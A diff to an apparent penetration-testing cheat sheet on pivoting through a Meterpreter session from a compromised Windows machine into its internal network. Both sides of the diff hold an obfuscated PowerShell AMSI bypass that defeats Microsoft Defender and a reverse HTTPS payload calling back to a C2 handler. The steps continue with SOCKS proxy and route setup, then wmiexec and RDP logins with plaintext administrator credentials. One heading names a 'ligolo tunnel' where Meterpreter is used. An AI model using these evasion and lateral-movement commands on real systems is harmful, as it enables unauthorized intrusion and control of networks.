@@ -1,5 +1,5 @@
 ===========================================================================================================================================
-Pivoting with Meterpreter (Metasploit) on a Windows server
+Pivoting with Meterpreter (Metasploit) on a Windows machine (laptop or server)
 ===========================================================================================================================================
 
 
@@ -97,7 +97,7 @@ HandlerSSLCert => /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem
 
 
 ===========================================================================================================================================
-Step 2 - Run the Meterpreter payload (reverse HTTPS payload) on the target Windows server
+Step 2 - Run the Meterpreter payload (reverse HTTPS payload) on the target Windows machine
 ===========================================================================================================================================
 
 Note: By generating an encrypted meterpreter payload and using an AMSI bypass our payload is not detected nor blocked by the Microsoft Defender AV running on the Windows target.
@@ -105,29 +105,24 @@ Note: By generating an encrypted meterpreter payload and using an AMSI bypass ou
 Microsoft Windows [Version 10.0.19044.2130]
 (c) Microsoft Corporation. All rights reserved.
 
-C:\Users\Administrator.PO718687>powershell -exec bypass
+C:\Users\Administrator> powershell -exec bypass
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
 
 Try the new cross-platform PowerShell https://aka.ms/pscore6
 
-PS C:\Users\Administrator.PO718687> sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;
-PS C:\Users\Administrator.PO718687> (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
-PS C:\Users\Administrator.PO718687> cd .\Documents\Tools-AD\
-PS C:\Users\Administrator.PO718687\Documents\Tools-AD> .\reversehttps.exe
-PS C:\Users\Administrator.PO718687\Documents\Tools-AD>
+PS C:\Users\Administrator> sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;
+PS C:\Users\Administrator> (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+PS C:\Users\Administrator> cd .\Documents\Tools-AD\
+PS C:\Users\Administrator\Documents\Tools-AD> .\reversehttps.exe
+PS C:\Users\Administrator\Documents\Tools-AD>
 
 
-=====================================================================================================================================================
-Step 3 - Configure the meterpreter handler (C2 server) to pivot into the internal network of the Windows target using a proxy socks5 and Proxychains
-=====================================================================================================================================================
+==============================================================================================================================================================
+Step 3 - Configure the meterpreter handler (C2 server) to pivot into the internal network of the target Windows machine using a proxy socks5 and Proxychains
+==============================================================================================================================================================
 
 [*] Started HTTPS reverse handler on https://192.168.56.104:443
-msf6 exploit(multi/handler) > sessions -i
-
-Active sessions
-===============
-No active sessions.
 
 msf6 exploit(multi/handler) > 
 [!] https://192.168.56.104:443 handling request from 192.168.56.1; (UUID: qghkh4ur) Without a database connected that payload UUID tracking will not work!
@@ -136,7 +131,7 @@ msf6 exploit(multi/handler) >
 [!] https://192.168.56.104:443 handling request from 192.168.56.1; (UUID: qghkh4ur) Without a database connected that payload UUID tracking will not work!
 [*] Meterpreter session 1 opened (192.168.56.104:443 -> 127.0.0.1 ) at 2022-11-01 18:34:12 +0100
 
-sessions -i
+msf6 exploit(multi/handler) > sessions -i
 
 Active sessions
 ===============
@@ -261,40 +256,20 @@ tcp_connect_time_out 8000
 # socks4  127.0.0.1 9050
 socks5  127.0.0.1 1080
 
-
-msf6 auxiliary(server/socks_proxy) > sessions -i 2
-[*] Starting interaction with 2...
-
-sessio
-meterpreter > run autoroute -s 192.168.1.0 -n 255.255.255.0
-
-[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
-[!] Example: run post/multi/manage/autoroute OPTION=value [...]
-[*] Adding a route to 192.168.1.0/255.255.255.0...
-[+] Added route to 192.168.1.0/255.255.255.0 via 192.168.1.113
-[*] Use the -p option to list all active routes
-meterpreter > background
-[*] Backgrounding session 2...
-
-
-msf6 auxiliary(server/socks_proxy) > jobs -l
-
-Jobs
-====
-  Id  Name                           Payload                            Payload opts
-  --  ----                           -------                            ------------
-  0   Exploit: multi/handler         windows/meterpreter/reverse_https  https://192.168.1.30:443
-  3   Auxiliary: server/socks_proxy
-
   
 ============================================================================================================================================
 Step 4 - Use Proxychains on your attack server (e.g. Kali VM) and the tunnel established with meterprter to pivot into the internal network
 ============================================================================================================================================
 
+Without going though the meterpreter session/tunnel, the Windows server with the IP '192.168.1.196' is not reachable from our Kali Linux box.
+jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ ping 192.168.1.196
+ping: connect: Network is unreachable
+
+
 Example 1 - wmiexec (impacket) connection to an internal server over the meterpreter tunnel
 --------------------------------------------------------------------------------------------
 
-msf6 auxiliary(server/socks_proxy) >  proxychains impacket-wmiexec administrator:Superpass2022@192.168.1.196
+msf6 auxiliary(server/socks_proxy) > proxychains impacket-wmiexec administrator:Superpass2022@192.168.1.196
 [*] exec:  proxychains impacket-wmiexec administrator:Superpass2022@192.168.1.196
 
 ProxyChains-3.1 (http://proxychains.sf.net)
@@ -314,3 +289,37 @@ Webserver1
 
 C:\>exit
 
+Example 2 - RDP connection to an internal server over the ligolo tunnel
+--------------------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ proxychains xfreerdp /f /u:administrator /p:Superpass2022 /v:192.168.1.196
+ProxyChains-3.1 (http://proxychains.sf.net)                                                                                                                                                                                                
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.196:3389-^[[B^[[B^[[B<><>-OK                                                                                                                                                                    
+[18:53:21:763] [1711:1712] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0                                                                                                
+[18:53:21:763] [1711:1712] [WARN][com.freerdp.crypto] - CN = Webserver1.company.work                                                                                                                                                       
+[18:53:21:765] [1711:1712] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                                                                                                                       
+[18:53:21:765] [1711:1712] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @                                                                                                                       
+[18:53:21:765] [1711:1712] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                                                                                                                       
+[18:53:21:766] [1711:1712] [ERROR][com.freerdp.crypto] - The hostname used for this connection (192.168.1.196:3389) 
+[18:53:21:766] [1711:1712] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
+[18:53:21:766] [1711:1712] [ERROR][com.freerdp.crypto] - Common Name (CN):
+[18:53:21:766] [1711:1712] [ERROR][com.freerdp.crypto] -        Webserver1.company.work
+[18:53:21:766] [1711:1712] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
+Certificate details for 192.168.1.196:3389 (RDP-Server):
+        Common Name: Webserver1.company.work
+        Subject:     CN = Webserver1.company.work
+        Issuer:      CN = Webserver1.company.work
+        Thumbprint:  6f:89:0e:c3:8e:31:f8:73:f8:20:6f:3c:4e:bd:05:f3:48:f6:4a:ae:b1:32:28:d3:38:a0:42:60:1f:4a:2e:fd
+The above X.509 certificate could not be verified, possibly because you do not have
+the CA certificate in your certificate store, or the certificate has expired.
+Please look at the OpenSSL documentation on how to add a private CA to the store.
+Do you trust the above certificate? (Y/T/N) y
+[18:53:28:562] [1711:1712] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
+[18:53:28:562] [1711:1712] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
+[18:53:28:691] [1711:1712] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
+[18:53:28:692] [1711:1712] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
+[18:53:29:687] [1711:1712] [WARN][com.freerdp.client.x11] - xf_lock_x11_:       [1] recursive lock from xf_process_x_events
+
+<SNIP>
+[18:54:16:997] [1711:1712] [INFO][com.freerdp.core] - ERRINFO_LOGOFF_BY_USER (0x0000000C):The disconnection was initiated by the user logging off their session on the server.
+[18:54:16:997] [1711:1712] [ERROR][com.freerdp.core] - rdp_set_error_info:freerdp_set_last_error_ex ERRINFO_LOGOFF_BY_USER [0x0001000C]
